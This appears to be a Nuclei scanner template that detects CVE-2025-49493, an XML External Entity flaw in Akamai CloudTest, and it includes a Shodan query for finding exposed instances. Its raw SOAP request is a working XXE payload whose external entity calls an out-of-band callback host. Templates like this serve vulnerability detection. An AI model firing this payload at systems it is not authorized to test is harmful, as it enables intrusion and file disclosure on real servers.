http/cves/2025/CVE-2025-49493.yaml

id: CVE-2025-49493

info:
  name: Akamai CloudTest - XML External Entity (XXE)
  author: xbow,3th1c_yuk1
  severity: high
  description: |
    Akamai CloudTest before 60 2025.06.02 (12988) allows file inclusion via XML External Entity (XXE) injection.
  reference:
    - https://xbow.com/blog/xbow-akamai-cloudtest-xxe/
    - https://techdocs.akamai.com/cloudtest/changelog/june-2-2025-enhancements-and-bug-fixes
    - https://nvd.nist.gov/vuln/detail/CVE-2025-49493
  metadata:
    shodan-query: html:"Akamai CloudTest"
    verified: true
    max-request: 1
  tags: cve,cve2025,akamai,cloudtest,xxe,injection

http:
  - raw:
      - |
        POST /concerto/services/RepositoryService HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/html
        SOAPAction: ""

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE soapenv:Envelope [
          <!ENTITY xxe SYSTEM "http://{{interactsh-url}}">
        ]>
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                          xmlns:rep="http://example.com/services/repository">
           <soapenv:Header/>
           <soapenv:Body>
              <rep:getUIBundleObjectXml>
                 <rep:uiBundleRequestXml>&xxe;</rep:uiBundleRequestXml>
              </rep:getUIBundleObjectXml>
           </soapenv:Body>
        </soapenv:Envelope>

    matchers:
      - type: dsl
        dsl:
          - 'contains(interactsh_protocol, "dns")'
          - 'contains(body, " XML stream")'
          - 'contains(content_type, "text/xml")'
        condition: and
